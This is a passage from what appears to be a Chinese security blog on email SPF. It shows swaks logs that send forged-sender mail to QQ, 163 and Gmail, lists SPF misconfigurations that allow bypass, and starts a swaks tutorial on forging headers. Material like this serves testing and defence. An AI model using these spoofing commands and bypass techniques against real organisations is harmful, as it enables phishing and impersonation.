https://service.mail.qq.com/detail/122/72.<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件163邮箱接收"><a href="#软拒绝-伪造的邮件163邮箱接收" class="headerlink" title="软拒绝-伪造的邮件163邮箱接收"></a>软拒绝-伪造的邮件163邮箱接收</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@<span class="hljs-number">163.</span>com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to 163 &quot;</span><br>=== Trying <span class="hljs-number">163</span>mx02.mxmail.netease.com:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">163</span>mx02.mxmail.netease.com.<br>&lt;-  <span class="hljs-number">220</span> <span class="hljs-number">163.</span>com Anti-spam GT for Coremail System (<span class="hljs-number">163</span>com[<span class="hljs-number">20141201</span>])<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-mail<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-AUTH LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-AUTH=LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-coremail <span class="hljs-number">1</span>Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2Ur8Yv9BUCa0xDrUUUUj<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">8</span>BITMIME<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; RCPT TO:&lt;test@<span class="hljs-number">163.</span>com&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">49</span>:<span class="hljs-number">46</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@<span class="hljs-number">163.</span>com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sun, <span class="hljs-number">09</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">49</span>:<span class="hljs-number">46</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230409084946.000022</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to <span class="hljs-number">163</span> <br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;-  <span class="hljs-number">250</span> Mail OK queued <span class="hljs-keyword">as</span> zwqz-mx-mta-g3<span class="hljs-number">-3</span>,_____wD3hm4rfDJkLRh1AQ-<span class="hljs-number">-.34322</span>S2 <span class="hljs-number">1681030189</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><p>会在信头的Authentication-Results字段中显示 spf 为软失败</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Authentication-Results: zwqz-mx-mta-g3-3; <span class="hljs-attribute">spf</span>=softfail smtp.<span class="hljs-attribute">mail</span>=admin@test.site;<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件google邮箱拒绝"><a href="#软拒绝-伪造的邮件google邮箱拒绝" class="headerlink" title="软拒绝-伪造的邮件google邮箱拒绝"></a>软拒绝-伪造的邮件google邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿c87bd1816ee7)-[/]<br>└─# swaks --to test@gmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to google &quot;</span><br>=== Trying gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com:<span class="hljs-number">25.</span>..<br>=== Connected to gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com.<br>&lt;-  <span class="hljs-number">220</span> mx.google.com ESMTP u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; EHLO c87bd1816ee7<br>&lt;-  <span class="hljs-number">250</span>-mx.google.com at your service, [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">157286400</span><br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-CHUNKING<br>&lt;-  <span class="hljs-number">250</span> SMTPUTF8<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> OK u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; RCPT TO:&lt;test@gmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> OK u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span>  Go ahead u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; Date: Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@gmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">08</span>:<span class="hljs-number">31</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230408070831.000062</span>@c87bd1816ee7&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt;<br> -&gt; all forgery to google<br> -&gt;<br> -&gt;<br> -&gt; .<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> The MAIL FROM domain [vict.site] has an SPF record <span class="hljs-keyword">with</span> a hard fail<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> policy (-all) but it fails to pass SPF checks <span class="hljs-keyword">with</span> the ip:<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]. To best protect our users <span class="hljs-keyword">from</span> spam and phishing,<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> the message has been blocked. Please visit<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span>  https:<span class="hljs-comment">//support.google.com/mail/answer/81126#authentication for more</span><br>&lt;** <span class="hljs-number">550</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span> information. u17<span class="hljs-number">-20020</span>a63ef11000000b004fba312c235si5393252pgh<span class="hljs-number">.411</span> - gsmtp<br> -&gt; QUIT<br>*** Remote host closed connection unexpectedly.<br></code></pre></td></tr></table></figure><h4 id="硬拒绝"><a href="#硬拒绝" class="headerlink" title="硬拒绝"></a>硬拒绝</h4><p>- 硬拒绝，</p><p>-all</p><p>vict.site的 SPF 设置为硬拒绝</p><figure class="highlight applescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs applescript">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─<span class="hljs-comment"># host -t txt test.site</span><br>vict.site descriptive <span class="hljs-built_in">text</span> <span class="hljs-string">&quot;v=spf1 ip4:121.43.138.1 -all&quot;</span><br></code></pre></td></tr></table></figure><h5 id="硬拒绝-伪造的邮件QQ邮箱拒绝"><a href="#硬拒绝-伪造的邮件QQ邮箱拒绝" class="headerlink" title="硬拒绝-伪造的邮件QQ邮箱拒绝"></a>硬拒绝-伪造的邮件QQ邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@foxmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to qq&quot;</span><br>=== Trying mx3.qq.com:<span class="hljs-number">25.</span>..<br>=== Connected to mx3.qq.com.<br>&lt;-  <span class="hljs-number">220</span> newxmmxszc6<span class="hljs-number">-2.</span>qq.com MX QQ Mail Server.<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-newxmmxszc6<span class="hljs-number">-2.</span>qq.com<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; RCPT TO:&lt;test@foxmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;.<br> -&gt; Date: Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">40</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@foxmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">58</span>:<span class="hljs-number">40</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230325085840.000144</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to qq<br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;** <span class="hljs-number">550</span> SPF check failed [MPheda7H5r2WwJffxgMR71aZMUWOXuOHHJuHE5PjvsqCDHQ3wc0MOqsrBXS2MiwuNQ==  IP: <span class="hljs-number">61.135</span><span class="hljs-number">.152</span><span class="hljs-number">.140</span>]. https:<span class="hljs-comment">//service.mail.qq.com/detail/122/72.</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye.<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><h5 id="硬拒绝-伪造的邮件163邮箱拒绝"><a href="#硬拒绝-伪造的邮件163邮箱拒绝" class="headerlink" title="硬拒绝-伪造的邮件163邮箱拒绝"></a>硬拒绝-伪造的邮件163邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@<span class="hljs-number">163.</span>com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;all forgery to 163 &quot;</span><br>=== Trying <span class="hljs-number">163</span>mx03.mxmail.netease.com:<span class="hljs-number">25.</span>..<br>=== Connected to <span class="hljs-number">163</span>mx03.mxmail.netease.com.<br>&lt;-  <span class="hljs-number">220</span> <span class="hljs-number">163.</span>com Anti-spam GT for Coremail System (<span class="hljs-number">163</span>com[<span class="hljs-number">20141201</span>])<br> -&gt; EHLO <span class="hljs-number">61804e0083</span>af<br>&lt;-  <span class="hljs-number">250</span>-mail<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-AUTH LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-AUTH=LOGIN PLAIN<br>&lt;-  <span class="hljs-number">250</span>-coremail <span class="hljs-number">1</span>Uxr2xKj7kG0xkI17xGrU7I0s8FY2U3Uj8Cz28x1UUUUU7Ic2I0Y2UFbexPCUCa0xDrUUUUj<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">73400320</span><br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">8</span>BITMIME<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; RCPT TO:&lt;test@<span class="hljs-number">163.</span>com&gt;<br>&lt;-  <span class="hljs-number">250</span> Mail OK<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span> End data <span class="hljs-keyword">with</span> &lt;CR&gt;&lt;LF&gt;.&lt;CR&gt;&lt;LF&gt;<br> -&gt; Date: Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">53</span>:<span class="hljs-number">24</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@<span class="hljs-number">163.</span>com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">25</span> Mar <span class="hljs-number">2023</span> <span class="hljs-number">08</span>:<span class="hljs-number">53</span>:<span class="hljs-number">24</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230325085324.000123</span>@<span class="hljs-number">61804e0083</span>af&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt; <br> -&gt; all forgery to <span class="hljs-number">163</span> <br> -&gt; <br> -&gt; <br> -&gt; .<br>&lt;** <span class="hljs-number">550</span> DI:SPF <span class="hljs-number">163</span> mx65,EN1pCgAnf1uEth5knwhKCw-<span class="hljs-number">-.17116</span>S2 <span class="hljs-number">1679734404</span>,please see http:<span class="hljs-comment">//mail.163.com/help/help_spam_16.htm?ip=218.30.113.52&amp;hostid=mx65&amp;time=1679734404</span><br> -&gt; QUIT<br>&lt;-  <span class="hljs-number">221</span> Bye<br>=== Connection closed <span class="hljs-keyword">with</span> remote host.<br></code></pre></td></tr></table></figure><h5 id="软拒绝-伪造的邮件google邮箱拒绝-1"><a href="#软拒绝-伪造的邮件google邮箱拒绝-1" class="headerlink" title="软拒绝-伪造的邮件google邮箱拒绝"></a>软拒绝-伪造的邮件google邮箱拒绝</h5><figure class="highlight clean"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs clean">┌──(root㉿<span class="hljs-number">61804e0083</span>af)-[/]<br>└─# swaks --to test@gmail.com --<span class="hljs-keyword">from</span> admin@test.site --body <span class="hljs-string">&quot;~all forgery to google &quot;</span><br>=== Trying gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com:<span class="hljs-number">25.</span>..<br>=== Connected to gmail-smtp-<span class="hljs-keyword">in</span>.l.google.com.<br>&lt;-  <span class="hljs-number">220</span> mx.google.com ESMTP b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; EHLO c87bd1816ee7<br>&lt;-  <span class="hljs-number">250</span>-mx.google.com at your service, [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]<br>&lt;-  <span class="hljs-number">250</span>-SIZE <span class="hljs-number">157286400</span><br>&lt;-  <span class="hljs-number">250</span><span class="hljs-number">-8</span>BITMIME<br>&lt;-  <span class="hljs-number">250</span>-STARTTLS<br>&lt;-  <span class="hljs-number">250</span>-ENHANCEDSTATUSCODES<br>&lt;-  <span class="hljs-number">250</span>-PIPELINING<br>&lt;-  <span class="hljs-number">250</span>-CHUNKING<br>&lt;-  <span class="hljs-number">250</span> SMTPUTF8<br> -&gt; MAIL FROM:&lt;admin@test.site&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.0</span> OK b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; RCPT TO:&lt;test@gmail.com&gt;<br>&lt;-  <span class="hljs-number">250</span> <span class="hljs-number">2.1</span><span class="hljs-number">.5</span> OK b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; DATA<br>&lt;-  <span class="hljs-number">354</span>  Go ahead b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; Date: Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">02</span>:<span class="hljs-number">37</span> +<span class="hljs-number">0000</span><br> -&gt; To: test@gmail.com<br> -&gt; From: admin@test.site<br> -&gt; Subject: test Sat, <span class="hljs-number">08</span> Apr <span class="hljs-number">2023</span> <span class="hljs-number">07</span>:<span class="hljs-number">02</span>:<span class="hljs-number">37</span> +<span class="hljs-number">0000</span><br> -&gt; Message-Id: &lt;<span class="hljs-number">20230408070237.000051</span>@c87bd1816ee7&gt;<br> -&gt; X-Mailer: swaks v20201014<span class="hljs-number">.0</span> jetmore.org/john/<span class="hljs-keyword">code</span>/swaks/<br> -&gt;<br> -&gt;  all forgery to google<br> -&gt;<br> -&gt;<br> -&gt; .<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> The MAIL FROM domain [vict.site] has an SPF record <span class="hljs-keyword">with</span> a hard fail<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> policy (-all) but it fails to pass SPF checks <span class="hljs-keyword">with</span> the ip:<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> [<span class="hljs-number">111.194</span><span class="hljs-number">.122</span><span class="hljs-number">.157</span>]. To best protect our users <span class="hljs-keyword">from</span> spam and phishing,<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span> the message has been blocked. Please visit<br>&lt;** <span class="hljs-number">550</span><span class="hljs-number">-5.7</span><span class="hljs-number">.26</span>  https:<span class="hljs-comment">//support.google.com/mail/answer/81126#authentication for more</span><br>&lt;** <span class="hljs-number">550</span> <span class="hljs-number">5.7</span><span class="hljs-number">.26</span> information. b6<span class="hljs-number">-20020</span>a170902d50600b0019f243b2dccsi6100977plg<span class="hljs-number">.415</span> - gsmtp<br> -&gt; QUIT<br>*** Remote host closed connection unexpectedly.<br></code></pre></td></tr></table></figure><h3 id="SPF绕过"><a href="#SPF绕过" class="headerlink" title="SPF绕过"></a>SPF绕过</h3><h4 id="配置不当"><a href="#配置不当" class="headerlink" title="配置不当"></a>配置不当</h4><h5 id="ip-范围过大"><a href="#ip-范围过大" class="headerlink" title="ip 范围过大"></a>ip 范围过大</h5><p>v&#x3D;spf1 ip4:113.113.1.1&#x2F;16 </p><p>允许范围为 113.113.1.1-113.113.255.255，会存在拿下一台服务器就可以实现绕过</p><h5 id="spf-软拒绝"><a href="#spf-软拒绝" class="headerlink" title="spf 软拒绝"></a>spf 软拒绝</h5><p>由于硬拒绝会直接拒收不符合条件的邮件，为避免邮件丢失，很多企业都会将SPF设置为软拒绝。这样就会导致存在</p><h5 id="spf-记录格式错误"><a href="#spf-记录格式错误" class="headerlink" title="spf 记录格式错误"></a>spf 记录格式错误</h5><p>特别注意，多个IP段，确保每个IP段的开头都是 ipv4</p><h5 id="邮件服务器未配置支持-spf"><a href="#邮件服务器未配置支持-spf" class="headerlink" title="邮件服务器未配置支持 spf"></a>邮件服务器未配置支持 spf</h5><p>spf有两步，第一步是在域名添加spf记录，第二步是在邮件服务器上配置支持spf</p><p>如果邮件服务器没有配置支持 spf，就例如我们声明了，但是无法验证</p><h5 id="spf-配置DNS错误"><a href="#spf-配置DNS错误" class="headerlink" title="spf 配置DNS错误"></a>spf 配置DNS错误</h5><p>spf 解析在公网 DNS，内部邮件服务器配置的是内网 DNS ，内网 DNS 无法解析 spf ，也就是邮件服务器无法使用公网 spf 验证</p><h5 id="内网缺乏限制"><a href="#内网缺乏限制" class="headerlink" title="内网缺乏限制"></a>内网缺乏限制</h5><p>攻击者进入内网，如果内部邮件服务器信任内网IP且开启</p><h3 id="SPF-报错"><a href="#SPF-报错" class="headerlink" title="SPF 报错"></a>SPF 报错</h3><h4 id="SPF-PermError-Too-Many-DNS-Lookups"><a href="#SPF-PermError-Too-Many-DNS-Lookups" class="headerlink" title="SPF PermError: Too Many DNS Lookups"></a>SPF PermError: Too Many DNS Lookups</h4><p>RFC 规范文档 <a href="https://tools.ietf.org/html/rfc7208">RFC7208</a> 规定每次SPF检查 DNS查询的 mechanisms 和 modifier 限制在十次以内，包括 include mechanism 或 redirect modifier 带来的查询。也就是说 SPF 查询所有允许IP的所需要的查询次数不可以超过 10 次，否则会返回“SPF PermError：too many DNS lookups”，SPF 永久错误在 DMARC 中被解释为 fail，从而会降低邮件送达率。</p><p>规避由于SPF DNS 查询造成的DDoS攻击，攻击过程为攻击者将可控的域名SPF记录指向被攻击域名，攻击者通过向不同的邮件服务器发送大量邮件，导致被攻击域名接受到 SPF DNS 查询的流量，如果被攻击域名SPF记录层级没有限制，就会造成DDoS攻击，如果限制在10次以内，放大倍数最多也就10倍，可以大幅度缓解攻击力度。</p><p>SPF查询次数查看</p><p><a href="https://dmarcly.com/tools/spf-record-checker">https://dmarcly.com/tools/spf-record-checker</a></p><p>解决方法</p><p>1、确保查询不要超过10次</p><p>2、使用 safe SPF ，也就是通过 dmarcly 生成特定的SPF记录规避超过十次</p><p>例如：</p><p>qq.com的SPF会被压缩如下SPF记录，需要更新原本域名的SPF记录</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">v=spf1 include:_u<span class="hljs-selector-class">.qq</span><span class="hljs-selector-class">.com</span>._spf<span class="hljs-selector-class">.dmarcld</span><span class="hljs-selector-class">.com</span> -<br></code></pre></td></tr></table></figure><h3 id="备注"><a href="#备注" class="headerlink" title="备注"></a>备注</h3><p>SPF验证 envelope From 地址，不验证头域 From地址</p><p>查看收件方SPF校验结果</p><p>gmail</p><p>显示原始邮件</p><p>163</p><p>查看信头，Authentication-Results字段可查看spf验证结果</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs routeros">Authentication-Results: zwqz-mx-mta-g2-3; <span class="hljs-attribute">spf</span>=pass smtp.<span class="hljs-attribute">mail</span>=admin@vict.site;<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>security</category>
      
      <category>mailsec</category>
      
    </categories>
    
    
    <tags>
      
      <tag>security</tag>
      
      <tag>mailsec</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>mailsec_swaks</title>
    <link href="/2024/05/16/security/itsec/mailsec/mailsec_swaks/"/>
    <url>/2024/05/16/security/itsec/mailsec/mailsec_swaks/</url>
    
    <content type="html"><![CDATA[<span id="more"></span><h2 id="swaks-SWiss-Army-Knife-Smtp"><a href="#swaks-SWiss-Army-Knife-Smtp" class="headerlink" title="swaks(SWiss Army Knife Smtp)"></a>swaks(SWiss Army Knife Smtp)</h2><h3 id="获取地址"><a href="#获取地址" class="headerlink" title="获取地址"></a>获取地址</h3><p>1、kali自带</p><p>2、官网</p><p><a href="http://www.jetmore.org/john/code/swaks/">http://www.jetmore.org/john/code/swaks/</a></p><p>3、yum install swaks</p><p>4、apt install swaks</p><h3 id="基本用法"><a href="#基本用法" class="headerlink" title="基本用法"></a>基本用法</h3><p>swaks -to 被测试的邮箱</p><h3 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h3><p>–header 邮件头信息，key:value (subject为标题)</p><p>–header-X-Mailer “value”   设置Mailer特征，不设置默认是带有swaks标记的（X-Mailer: swaks v20190914.0 jetmore.org&#x2F;john&#x2F;code&#x2F;swaks&#x2F;）</p><p>–header-Message-Id “value”   设置邮件Message-ID</p><p>–ehlo value 伪造ehlo头，要伪造发件人的域名，提供身份认证</p><p>–body value 邮件正文</p><p>–to 邮件接收者，多个接收者使用“,”进行分隔</p><p>–from 伪造的发件人</p><p>发送模板邮件</p><p>原始邮件转存为eml文件，swaks参数–data设置为保存的eml文件。</p><p>伪造的邮件和原始邮件不同点：</p><p>1、查看邮件原文：Sender不同</p><p>​Sender: 